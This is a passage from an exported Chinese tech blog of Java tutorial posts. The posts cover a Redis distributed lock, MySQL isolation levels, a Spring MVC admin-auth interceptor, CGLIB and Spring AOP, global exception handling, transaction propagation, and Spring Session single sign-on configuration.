Long.parseLong(PropertiesUtil.getProperty("lock.timeout")); Long setnxResult = RedisShardPoolUtil.setnx(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,String.valueOf(System.currentTimeMillis()+timeout)); if(setnxResult != null &amp;&amp; setnxResult.intValue() ==1)&#123; //说明被当前的tomcat进程抢到锁，下面就可以关闭订单 closeOrder(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125;else &#123; //在没有拿到锁的情况下，也要进行相应的判断，确保不死锁 String lockValueStr = RedisShardPoolUtil.get(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); //如果判断锁是存在的并且现在已经超时了，那么我们这个进程就有机会去占有这把锁 if(lockValueStr != null &amp;&amp; System.currentTimeMillis() &gt; Long.parseLong(lockValueStr))&#123; //当前进程进行get set操作，拿到老的key，再塞进新的超时时间 String getSetResult = RedisShardPoolUtil.getset(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK,String.valueOf(System.currentTimeMillis()+timeout)); //如果拿到的是空的，说明老的锁已经释放，那么当前进程有权占有这把锁进行操作； //如果拿到的不是空的，说明老的锁仍然占有，并且这次getset拿到的key与上面查询get得到的key一样的话，说明没有被其他进程刷新，那么本进程还是有权占有这把锁进行操作 if(getSetResult == null || (getSetResult != null &amp;&amp; StringUtils.equals(lockValueStr,getSetResult)))&#123; closeOrder(Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125;else &#123; log.info("没有获取分布式锁：&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125; &#125;else &#123; log.info("没有获取分布式锁：&#123;&#125;",Const.REDIS_LOCK.CLOSE_ORDER_TASK_LOCK); &#125; &#125; log.info("关闭订单定时任务结束");&#125; 这样两次的防死锁措施，不仅可以防止死锁，还可以提高效率。 7、mysql事务select .. for update参考： https://www.cnblogs.com/houweijian/p/5869243.html https://www.cnblogs.com/linjiqin/p/5106051.html ==扩展== mysql四种事务隔离机制 read uncommitted:读取未提交内容两个线程，其中一个线程执行了更新操作，但是没有提交，另一个线程在事务内就会读到该线程未提交的数据。 read committed:读取提交内容（不可重复读）针对第一种情况，一个线程在一个事务内不会读取另一个线程未提交的数据了。但是，读到了另一个线程更新后提交的数据，也就是说重复读表的时候，数据会不一致。显然这种情况也是不合理的，所以叫不可重复读。 repeatable read:可重复读（默认）可重复读，显然解决2中的问题，即一个线程在一个事务内不会再读取到另一个线程提交的数据，保证了该线程在这个事务内的数据的一致性。 对于某些情况，这种方案会出现幻影读，他对于更新操作是没有任何问题的了，但是对于插入操作，有可能在一个事务内读到新插入的数据（但是MySQL中用多版本并发控制机制解决了这个问题），所以默认使用的就是这个机制，没有任何问题。 serializable:序列化略。 存储引擎MySQL默认使用的是InnoDB，支持事务。还有例如MyISAM,这种存储引擎不支持事务，只支持只读操作，在用到数据的修改的地方，一般都是用默认的InnoDB存储引擎。 索引的一个注意点一般类型为normal和unique，用btree实现，对于联合索引(字段1和字段2)，在执行查询的时候，例如select * from xxx where 字段1=&quot;xxx&quot; ...是可以利用到索引的高性能查询的，但是如果是 select * from xxx where 字段2=&quot;xxx&quot; ...，效率跟普通的查询时一样的，因为用索引进行查询，最左边的那个字段必须要有，否则无效。]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[23、springmvc拦截器]]></title>
    <url>%2F2018%2F07%2F21%2F23%E3%80%81springmvc%E6%8B%A6%E6%88%AA%E5%99%A8%2F</url>
    <content type="text"><![CDATA[springmvc拦截器 1、引入原因针对后端代码，每个方法都需要验证用户是否登陆以及用户是否是管理员，代码大量地重复，这里用springmvc的拦截器对后端代码进行统一的拦截验证。 2、配置后端的代码的url都是这样的de格式：/manage/xx/xx.do,所以要对/manage下面所有的子路径进行拦截，需要用/manage/**来拦截。 123456&lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path="/manage/**"/&gt; &lt;bean class="com.swg.controller.common.interceptor.AuthorityInterceptor"/&gt; &lt;/mvc:interceptor&gt;&lt;/mvc:interceptors&gt; 3、java代码代码的主要思路： 根据Object handler获取类名 和方法名，后面用来进行判断是否是登陆操作和富文本上传操作。 根据request.getParameterMap()拿到登陆用户的username和password参数 如果是login方法,直接放过，不拦截 如果是除了login.do的操作，那么先获取cookie，拿到loginToken，根据loginToken再从redis中拿到userstr，反序列化得到user对象 如果user不为空并且是管理员身份，那么就直接放过。 如果user是空的，如果方法是富文本上传richtextImgUpload方法，则用特定格式返回，提示登陆；如果是其他的操作，直接将ServerResponse携带错误信息的json返回回去。 如果user不是空的，这个时候必然是一个普通用户，还是跟第6条一样，分别提示权限不够。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788@Slf4jpublic class AuthorityInterceptor implements HandlerInterceptor&#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; //对handler进行强转 HandlerMethod handlerMethod = (HandlerMethod)handler; //获取class的名字和方法名字 String methodName = handlerMethod.getMethod().getName(); String className = handlerMethod.getBean().getClass().getSimpleName(); //对登陆输入的参数进行提取和封装 StringBuffer requestParamBuffer = new StringBuffer(); Map paramMap = request.getParameterMap(); Iterator it = paramMap.entrySet().iterator(); if(it.hasNext())&#123; Map.Entry entry = (Map.Entry) it.next(); String mapKey = (String) entry.getKey(); String mapValue = StringUtils.EMPTY; Object obj = entry.getValue(); if(obj instanceof String[])&#123; String[] strs = (String[]) obj; mapValue = Arrays.toString(strs); &#125; requestParamBuffer.append(mapKey).append("=").append(mapValue); &#125; //对于拦截器中的manage下的login.dou不拦截 if(StringUtils.equals(className,"UserManageController") &amp;&amp; StringUtils.equals(methodName,"login"))&#123; log.info("权限拦截器拦截到请求，className:&#123;&#125;,methodName:&#123;&#125;",className,methodName); return true; &#125; log.info("权限拦截器拦截到请求，className:&#123;&#125;,methodName:&#123;&#125;,params:&#123;&#125;",className,methodName,requestParamBuffer); User user = null; String loginToken = CookieUtil.readLoginToken(request); if(StringUtils.isNotEmpty(loginToken))&#123; String userJsonStr = RedisShardPoolUtil.get(loginToken); user = JsonUtil.Str2Obj(userJsonStr,User.class); &#125; //如果获取到的user是空（未登陆），或者，user不是管理员的话（普通用户） if(user == null || (user.getRole().intValue() != Const.Role.ROLE_ADMIN))&#123; response.reset(); response.setCharacterEncoding("UTF-8"); response.setContentType("application/json;charset=UTF-8"); PrintWriter out = response.getWriter(); if(user == null)&#123; //用户为空 //如果是富文本上传的方法，错误的返回提示要单独处理一下 if(StringUtils.equals(className,"ProductManageController") &amp;&amp; (StringUtils.equals(methodName,"richtextImgUpload")))&#123; Map resultMap = Maps.newHashMap(); resultMap.put("success",false); resultMap.put("msg","用户未登陆，请登录管理员"); out.print(JsonUtil.obj2String(resultMap)); &#125;else &#123; //这里就是普通的ServerResponse对象返回 out.print(JsonUtil.obj2String(ServerResponse.createByErrorMessage("拦截器拦截，用户未登陆"))); &#125; &#125;else &#123; //用户是一个普通用户 //如果是富文本上传的方法，错误的返回提示要单独处理一下 if(StringUtils.equals(className,"ProductManageController") &amp;&amp; (StringUtils.equals(methodName,"richtextImgUpload")))&#123; Map resultMap = Maps.newHashMap(); resultMap.put("success",false); resultMap.put("msg","权限不够，请登录管理员"); out.print(JsonUtil.obj2String(resultMap)); &#125;else &#123; //这里就是普通的ServerResponse对象返回 out.print(JsonUtil.obj2String(ServerResponse.createByErrorMessage("拦截器拦截，用户无权限操作"))); &#125; &#125; out.flush(); out.close(); return false; &#125; //user是一个管理员登陆，并且不为空 return true; &#125; @Override public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception &#123; System.out.println("postHandle"); &#125; @Override public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception &#123; System.out.println("afterCompletion"); &#125;&#125; 4、对于map的遍历 3中有个对Map的遍历代码，对其进行整理。 123456789101112131415161718192021222324252627282930public static void main(String[] args) &#123; Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;(); map.put("1", "value1"); map.put("2", "value2"); map.put("3", "value3"); //第一种：普遍使用，二次取值；keySet()是直接拿key for (String key : map.keySet()) &#123; System.out.println("key= "+ key + " and value= " + map.get(key)); &#125; //第二种，本代码用的就是这个，map.entrySet()存放是key-value键值对 Iterator&lt;Map.Entry&lt;String, String&gt;&gt; it = map.entrySet().iterator(); while (it.hasNext()) &#123; Map.Entry&lt;String, String&gt; entry = it.next(); System.out.println("key= " + entry.getKey() + " and value= " + entry.getValue()); &#125; //第三种：推荐，尤其是容量大时 for (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123; System.out.println("key= " + entry.getKey() + " and value= " + entry.getValue()); &#125; //第四种，map.values()直接拿出所有的value值 for (String v : map.values()) &#123; System.out.println("value= " + v); &#125; &#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[23.SpringAop--动态代理模式]]></title>
    <url>%2F2018%2F07%2F21%2F23.SpringAop--%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[spring aop中用到了两大主流的动态代理模式。 jdk代理在java基础中已经对其进行了详细的说明，略过。 cglib实现原理什么是CGLIB?CGLIB是一个功能强大，高性能的代码生成包。它为没有实现接口的类提供代理，为JDK的动态代理提供了很好的补充。通常可以使用Java的动态代理创建代理，但当要代理的类没有实现接口或者为了更好的性能，CGLIB是一个好的选择。 CGLIB原理CGLIB原理：动态生成一个要代理类的子类，子类重写要代理的类的所有不是final的方法。在子类中采用方法拦截的技术拦截所有父类方法的调用，顺势织入横切逻辑。它比使用java反射的JDK动态代理要快。 CGLIB底层：使用字节码处理框架ASM，来转换字节码并生成新的类。不鼓励直接使用ASM，因为它要求你必须对JVM内部结构包括class文件的格式和指令集都很熟悉。 CGLIB缺点：对于final方法，无法进行代理。 CGLIB的应用广泛的被许多AOP的框架使用，例如Spring AOP和dynaop。Hibernate使用CGLIB来代理单端single-ended(多对一和一对一)关联。 demo定义一个类：12345public class RealSubject&#123; public void request()&#123; System.out.println("this is realSubject"); &#125;&#125; 定义一个拦截器。在调用目标方法时，CGLib会回调MethodInterceptor接口方法拦截，来实现你自己的代理逻辑，类似于JDK中的InvocationHandler接口。 123456789101112131415public class DemoMethodInterceptor implements MethodInterceptor&#123; @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy methodProxy) throws Throwable &#123; System.out.println("before in cglib"); Object result = null; try&#123; result = methodProxy.invokeSuper(obj,args); &#125;catch (Exception e)&#123; throw e; &#125;finally &#123; System.out.println("after in cglib"); &#125; return result; &#125;&#125; Object为目标对象 Method为上文中实体类所调用的被代理的方法引用 Object[]为参数值列表 MethodProxy为生成的代理类对方法的代理引用。 生成动态代理类：12345678910111213public class Client &#123; public static void main(String[] args) &#123; //创建Enhancer实例 Enhancer enhancer = new Enhancer(); //通过setSuperclass方法来设置目标类 enhancer.setSuperclass(RealSubject.class); //通过setCallback 方法来设置拦截对象 enhancer.setCallback(new DemoMethodInterceptor()); //create方法生成Target的代理类，并返回代理类的实例 RealSubject subject = (RealSubject) enhancer.create(); subject.request(); &#125;&#125; 这里Enhancer类是CGLib中的一个字节码增强器，它可以方便的对你想要处理的类进行扩展，以后会经常看到它。 首先将被代理类TargetObject设置成父类，然后设置拦截器TargetInterceptor，最后执行enhancer.create()动态生成一个代理类，并从Object强制转型成父类型RealSubject。 最后，在代理类上调用方法. jdk和cglib代理对比 JDK只能针对有接口的类的的接口方法进行动态代理 Cglib基于继承来实现代理，无法对static，final类进行代理 Cglib基于继承来实现代理，无法对private，static方法进行代理 spring如何创建aop代理类 如果目标对象实现了接口，则默认采用 JDK 动态代理 如果目标对象没有实现接口，则采用 Cglib 进行动态代理 如果目标对象实现了接口，且强制 Cglib 代理，则使用 Cglib 代理 12//强制使用cglib代理@EnableAspectJAutoProxy(proxyTargetClass = true)]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[22、springMVC全局异常+spring包扫描包隔离+spring事务传播]]></title>
    <url>%2F2018%2F07%2F21%2F22%E3%80%81springMVC%E5%85%A8%E5%B1%80%E5%BC%82%E5%B8%B8%2Bspring%E5%8C%85%E6%89%AB%E6%8F%8F%E5%8C%85%E9%9A%94%E7%A6%BB%2Bspring%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%2F</url>
    <content type="text"><![CDATA[springMVC全局异常+spring包扫描包隔离+spring事务传播 1、全局异常引入原因假设在我们的login.do的controller方法中第一行增加一句： int i = 1/0; 重新启动服务器进行用户登录操作，那么就会抛出异常： 123java.lang.ArithmeticException: / by zero com.swg.controller.portal.UserController.login(UserController.java:37) ...其他的堆栈信息 这些信息会直接显示在网页上，如果是关于数据库的错误，同样，会详细地将数据库中的字段都显示在页面上，这对于我们的项目来说是存在很大的安全隐患的。这个时候，需要用全局异常来处理，如果发生异常，我们就对其进行拦截，并且在页面上显示我们给出的提示信息。 2、引入全局异常12345678910111213@Slf4j@Componentpublic class ExceptionResolver implements HandlerExceptionResolver&#123; @Override public ModelAndView resolveException(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) &#123; log.error("exception:&#123;&#125;",httpServletRequest.getRequestURI(),e); ModelAndView mv = new ModelAndView(new MappingJacksonJsonView()); mv.addObject("status",ResponseEnum.ERROR.getCode()); mv.addObject("msg","接口异常，详情请查看日志中的异常信息"); mv.addObject("data",e.toString()); return mv; &#125;&#125; 那么，再执行登陆操作之后，就不会在页面上直接显示异常信息了。有效地屏蔽了关键信息。 3、spring和springmvc配置文件的优化在编写全局异常之前，先进行了包隔离和优化，一期中的扫描包的写法是：12345#spring:&lt;context:component-scan base-package="com.swg" annotation-config="true"/&gt;#springmvc:&lt;context:component-scan base-package="com.swg" annotation-config="true"/&gt; 即spring和springmvc扫描包下面的所有的bean和controller. 优化后的代码配置：1234567891011#spring&lt;context:component-scan base-package="com.swg" annotation-config="true"&gt;&lt;!--将controller的扫描排除掉--&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt;&lt;/context:component-scan&gt;#springmvc&lt;context:component-scan base-package="com.swg.controller" annotation-config="true" use-default-filters="false"&gt;&lt;!--添加白名单，只扫描controller，总之要将service给排除掉即可--&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt;&lt;/context:component-scan&gt; 这样做的原因是：Spring和SpringMVC是有父子容器关系的，而且正是因为这个才往往会出现包扫描的问题。 ==针对包扫描只要记住以下几点即可==： spring是父容器，springmvc是子容器，子容器可以访问父容器的bean,父容器不能访问子容器的bean。 只有顶级容器（spring）才有加强的事务能力，而springmvc容器的service是没有的。 如果springmvc不配置包扫描的话，页面404. 针对事务，不得不展开说明spring事务的几种传播机制了。在 spring的 TransactionDefinition接口中一共定义了七种事务传播属性： PROPAGATION_REQUIRED – 支持当前事务，如果当前没有事务，就新建一个事务。这是最常见的选择（默认）。 PROPAGATION_SUPPORTS – 支持当前事务，如果当前没有事务，就以非事务方式执行。 PROPAGATION_MANDATORY – 支持当前事务，如果当前没有事务，就抛出异常。 PROPAGATION_REQUIRES_NEW – 新建事务，如果当前存在事务，把当前事务挂起。 PROPAGATION_NOT_SUPPORTED – 以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。 PROPAGATION_NEVER – 以非事务方式执行，如果当前存在事务，则抛出异常。 PROPAGATION_NESTED – 如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则进行与PROPAGATION_REQUIRED类似的操作。 ==补充== Spring默认情况下，会对运行期例外(RunTimeException)，即uncheck异常，进行事务回滚。 如果遇到checked异常就不回滚。 如何改变默认规则： 让checked例外也回滚：在整个方法前加上 @Transactional(rollbackFor=Exception.class) 让unchecked例外不回滚： @Transactional(notRollbackFor=RunTimeException.class) 不需要事务管理的(只查询的)方法：@Transactional(propagation=Propagation.NOT_SUPPORTED) ==那么什么是嵌套事务呢？== 嵌套是子事务套在父事务中执行，子事务是父事务的一部分，在进入子事务之前，父事务建立一个回滚点，叫做save point，然后执行子事务，这个子事务的执行也算是父事务的一部分，然后子事务执行结束，父事务继续执行。重点在于那个save point，看以下几个问题： 如果子事务回滚，会发生什么？ 父事务会回到进入子事务前建立的save point，然后尝试其他的事务或者其他的业务逻辑，父事务之前的操作不会受到影响，更不会自动回滚。 如果父事务回滚，会发生什么？ 父事务回滚，子事务也会跟着回滚，为什么呢？因为父事务结束之前，子事务是不会提交的，我们说子事务是父事务的一部分，正是这个道理/ 父事务先提交，然后子事务再提交；还是子事务先提交，然后父事务再提交呢？ 答案是第二种情况，子事务是父事务的一部分，由父事务同意提交。 4、spring配置文件的一些理解： 容器 在Spring整体框架的核心概念中，容器是核心思想，就是用来管理Bean的整个生命周期的，而在一个项目中，容器不一定只有一个，Spring中可以包括多个容器，而且容器有上下层关系，目前最常见的一种场景就是在一个项目中引入Spring和SpringMVC这两个框架，那么它其实就是两个容器，Spring是父容器，SpringMVC是其子容器，并且在Spring父容器中注册的Bean对于SpringMVC容器中是可见的，而在SpringMVC容器中注册的Bean对于Spring父容器中是不可见的，也就是子容器可以看见父容器中的注册的Bean，反之就不行。 &lt;context:component-scan base-package=”com.springmvc.test” /&gt; 我们可以使用统一的如下注解配置来对Bean进行批量注册，而不需要再给每个Bean单独使用xml的方式进行配置。 从Spring提供的参考手册中我们得知该配置的功能是扫描配置的base-package包下的所有使用了@Component注解的类，并且将它们自动注册到容器中，同时也扫描@Controller，@Service，@Respository这三个注解，因为他们是继承自@Component。 context:annotation-config/ 其实有了上面的配置，这个是可以省略掉的，因为上面的配置会默认打开以下配置。以下配置会默认声明了@Required、@Autowired、 @PostConstruct、@PersistenceContext、@Resource、@PreDestroy等注解。 &lt;mvc:annotation-driven /&gt; 这个是SpringMVC必须要配置的，因为它声明了@RequestMapping、@RequestBody、@ResponseBody等。并且，该配置默认加载很多的参数绑定方法，比如json转换解析器等。 总结 在实际工程中会包括很多配置，我们按照官方推荐根据不同的业务模块来划分不同容器中注册不同类型的Bean：Spring父容器负责所有其他非@Controller注解的Bean的注册，而SpringMVC只负责@Controller注解的Bean的注册，使得他们各负其责、明确边界。]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[22.SpringAop--基本使用和切点表达式]]></title>
    <url>%2F2018%2F07%2F21%2F22.SpringAop--%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E5%88%87%E7%82%B9%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[spring aop继续学习。 概览基本认识 是一种编程范式，不是编程语言 解决特定问题，不能解决所有问题 是 OOP 的补充，不是替代 AOP设计初衷 解决代码重复性问题（核心要点一） 解决关注点分离问题（核心要点二） 水平分离：展示层-》服务层-》持久层 垂直分离：模块划分（订单、库存） 切面分离：分离功能性需求和非功能徐求 使用AOP的好处 集中处理某一关注点/横切逻辑 可以很方便地添加/删除关注点 侵入性少，增强代码可读性以及可维护性 AOP的应用场景 权限控制 缓存控制 事务控制 审计日志 性能监控 分布式追踪 异常处理 spring使用aop的一个demo测试案例背景 产品管理的服务 产品添加/删除的操作只能管理员才能进行 普通实现 vs AOP实现 创建工程代码地址：https://gitee.com/_swg/springaop 搭建spring-boot工程（略）。 首先要有一个简单的实体类：Product 12345@Datapublic class Product &#123; private Long id; private String name;&#125; 逻辑层：ProductService 12345678910@Servicepublic class ProductService &#123; public void insert(Product product)&#123; System.out.println("insert product"); &#125; public void delete(Long id)&#123; System.out.println("delete product"); &#125;&#125; 如果要实现插入/删除操作的权限控制，那么传统的做法是：我们写一个方法来判断这个user到底有没有权限操作嘛： 1234567891011121314151617@Servicepublic class ProductService &#123; @Autowired private AuthService authService; public void insert(Product product)&#123; //判断是否可以操作 authService.checkAccess(); System.out.println("insert product"); &#125; public void delete(Long id)&#123; //判断是否可以操作 authService.checkAccess(); System.out.println("delete product"); &#125;&#125; 继续来实现authService来模拟一下权限控制： 12345678910@Servicepublic class AuthService &#123; public void checkAccess()&#123; String user = CurrentUserHolder.get(); //user不是 admin 就没有权限，直接抛出异常 if(!"admin".equals(user))&#123; throw new RuntimeException("没有权限操作"); &#125; &#125;&#125; 我们这个user信息是存放在ThreadLocal中的，不了解ThreadLocal的同学可以到我的 java基础 标签下查看最后两篇文章的详细讲解吧！ 1234567891011public class CurrentUserHolder &#123; private static final ThreadLocal&lt;String&gt; holder = new ThreadLocal&lt;String&gt;(); public static String get()&#123; return holder.get() == null ? "unkonwn" : holder.get(); &#125; public static void set(String user)&#123; holder.set(user); &#125;&#125; 下面就可以进行测试了： 1234567891011121314151617181920@RunWith(SpringRunner.class)@SpringBootTestpublic class SpringaopApplicationTests &#123; @Autowired private ProductService productService; //预期应该有异常 @Test(expected = Exception.class) public void checkDeleteUser() &#123; CurrentUserHolder.set("tom"); productService.delete(1L); &#125; //有权限，所以不抛异常 @Test public void checkDeleteUser2() &#123; CurrentUserHolder.set("admin"); productService.delete(1L); &#125;&#125; 这种属于硬编码，增加代码复杂度，不容易维护。下面用AOP来实现。 首先是写一个切面类，确定切面的功能、发生时机： 1234567891011121314151617181920@Aspect@Componentpublic class SecurityAspect &#123; @Autowired private AuthService authService; //只要出现注解了，那么下面的@Before就会先执行 //制定哪些类那些方法可以执行@Advice的代码 @Pointcut(value = "@annotation(AdminOnly)") public void adminOnly()&#123; &#125; //@Advice：执行时机 @Before("adminOnly()") public void checkAccess()&#123; authService.checkAccess(); &#125;&#125; 这个注解： 1234@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.METHOD&#125;)public @interface AdminOnly &#123;&#125; 那么，我们只需要在需要权限验证的方法上增加一个注解，就可以自动完成权限的验证： 1234@AdminOnlypublic void delete(Long id)&#123; System.out.println("delete product");&#125; 测试一把，如预期正确执行。 PointCut Express expression designators : “excution()” 等 wildcards : “*” 和 “..” 和 “+” operators : “&amp;&amp;” 和 “||” 和 “！” designators（指示器）重点是了解 execution() ，其他的知道有就行了。 其中，匹配对象： this:匹配AOP对象的目标对象为指定类型的方法，即DemoDao的aop代理对象的方法 12@Pointcut("this(com.swg.DemoDao)")public void thisDemo()&#123;&#125; target:匹配实现IDao接口的目标对象（而不是aop代理后的对象）的方法，这里即DemoDao的方法 12@Pointcut("target(com.swg.DemoDao)")public void targetDemo()&#123;&#125; bean:匹配所有以Service结尾的bean里头的方法 12@Pointcut("bean(*Service)")public void beanDemo()&#123;&#125; wildcards（通配符） “*” 匹配任意数量的字符 “+” 匹配制定类及其子类 “..” 一般用于匹配任意数的子包或参数 operators（运算符） “&amp;&amp;” 与操作符 “||” 或操作符 “!” 非操作符]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[21.spring aop基本使用]]></title>
    <url>%2F2018%2F07%2F21%2F21.spring%20aop%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[spring aop简单例子学习。 什么是aop指在程序运行期间动态地将某段代码切入到指定方法指定位置进行运行的编程方式。 先简单用一下spring aop首先要导入依赖：spring-aspects12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aspects&lt;/artifactId&gt; &lt;version&gt;4.3.12.RELEASE&lt;/version&gt;&lt;/dependency&gt; 写一个业务逻辑类：1234567public class MathCaculator &#123; public int div(int i,int j)&#123; return i/j; &#125;&#125; 我们要向在这个业务逻辑方法运行前，运行结束时，方法出现异常时都将日志文件打印。 定义一个日志切面类切面类里面的方法需要动态感知MathCaculator.div运行到哪里。 通知方法： 前置通知(@Before)：logStart()：在目标方法div运行之前运行 后置通知(@After)：logEnd():在目标方法div运行结束之后运行 返回通知(@AfterReturning)：logReturn():在目标方法div运行正常返回之后运行 异常通知(@AfterThrowing)：logException():在目标方法div出现异常之后运行 环绕通知(@Around)：动态代理，手动推进目标方法运行 123456789101112131415161718192021222324252627282930@Aspectpublic class LogAspect &#123; @Pointcut("execution(public int com.swg.aop.MathCaculator.*(..))") public void pointCut()&#123;&#125; @Before("pointCut()") public void logStart(JoinPoint joinPoint)&#123; String methodName = joinPoint.getSignature().getName(); Object[] args = joinPoint.getArgs(); System.out.println("【@Before】...方法名：&#123;"+methodName+"&#125;...参数列表是-&gt;&#123;"+ Arrays.asList(args)+"&#125;"); &#125; @After("pointCut()") public void logEnd(JoinPoint joinPoint)&#123; System.out.println("【@After】...&#123;"+joinPoint.getSignature().getName()+"&#125;结束..."); &#125; @AfterReturning(value = "pointCut()",returning = "result") public void logReturn(JoinPoint joinPoint,Object result)&#123; System.out.println("【@AfterReturning】...&#123;"+joinPoint.getSignature().getName()+"&#125;正常返回，运行结果是&#123;"+result+"&#125;"); &#125; @AfterThrowing(value = "pointCut()",throwing = "exception") public void logException(JoinPoint joinPoint,Exception exception)&#123; System.out.println("【@AfterThrowing】...&#123;"+joinPoint.getSignature().getName()+"&#125;发生异常,异常信息是&#123;"+exception.getMessage()+"&#125;"); &#125;&#125; 切面类和业务逻辑类都加入到容器中123456789101112131415@EnableAspectJAutoProxy@Configurationpublic class MainConfigOfAop &#123; @Bean public MathCaculator mathCaculator()&#123; return new MathCaculator(); &#125; @Bean public LogAspect aspect()&#123; return new LogAspect(); &#125;&#125; 容器启动12345678@Testpublic void test01()&#123; AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfigOfAop.class); System.out.println("容器已经启动成功..."); MathCaculator caculator = applicationContext.getBean(MathCaculator.class); caculator.div(6,2); applicationContext.close();&#125; 无异常的情况输出12345容器已经启动成功...【@Before】...方法名：&#123;div&#125;...参数列表是-&gt;&#123;[6, 2]&#125;div...【@After】...&#123;div&#125;结束...【@AfterReturning】...div正常返回，运行结果是&#123;3&#125; 有异常的情况输出12345容器已经启动成功...【@Before】...方法名：&#123;div&#125;...参数列表是-&gt;&#123;[6, 0]&#125;div...【@After】...&#123;div&#125;结束...【@AfterThrowing】...&#123;div&#125;发生异常,异常信息是&#123;/ by zero&#125; 主要是有三步： 将业务逻辑组件和切面类都加入到容器中，告诉spring哪个是切面类(@Aspect) 在切面类上的每一个通知方法上标注通知注释，告诉spring合适何地运行(切入点表达式) 开启基于注解的aop模式(@EnableAspectJAutoProxy)]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[21、springSession实现单点登录]]></title>
    <url>%2F2018%2F07%2F21%2F21%E3%80%81springSession%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[springSession实现单点登录 1、回顾之前的用redis+cookie+jackson+filter实现单点登录,对现有的代码侵入性比较强，spring提供了spring session框架，可以实现无代码侵入的单点登录功能。 2、引入依赖12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt; &lt;version&gt;1.2.0.RELEASE&lt;/version&gt;&lt;/dependency&gt; 3、web.xml:12345678&lt;filter&gt; &lt;filter-name&gt;springSessionRepositoryFilter&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;springSessionRepositoryFilter&lt;/filter-name&gt; &lt;url-pattern&gt;*.do&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 4、配置文件applicationContext-spring-session.xml123456789101112131415161718192021222324252627282930313233343536&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xmlns:jdbc="http://www.springframework.org/schema/jdbc" xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation=" http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"&gt; &lt;!--设置redis中session有效期--&gt; &lt;bean id="redisHttpSessionConfiguration" class="org.springframework.session.data.redis.config.annotation.web.http.RedisHttpSessionConfiguration"&gt; &lt;property name="maxInactiveIntervalInSeconds" value="1800"/&gt; &lt;/bean&gt; &lt;!--cookie显示的名字等配置--&gt; &lt;bean id="defaultCookieSerializer" class="org.springframework.session.web.http.DefaultCookieSerializer"&gt; &lt;property name="cookieName" value="SESSION_NAME" /&gt; &lt;property name="domainName" value="oursnail.com"/&gt; &lt;property name="cookiePath" value="/"/&gt; &lt;property name="cookieMaxAge" value="31536000"/&gt; &lt;/bean&gt; &lt;!--redis连接池的初始化参数配置--&gt; &lt;bean id="jedisPoolConfig" class="redis.clients.jedis.JedisPoolConfig"&gt; &lt;property name="maxTotal" value="20"/&gt; &lt;/bean&gt; &lt;!--redis连接的参数--&gt; &lt;bean id="jedisConnectionFactory" class="org.springframework.data.redis.connection.jedis.JedisConnectionFactory"&gt; &lt;property name="hostName" value="127.0.0.1"/&gt; &lt;property name="port" value="6379"/&gt; &lt;property name="poolConfig" ref="jedisPoolConfig"/&gt; &lt;/bean&gt;&lt;/beans&gt; 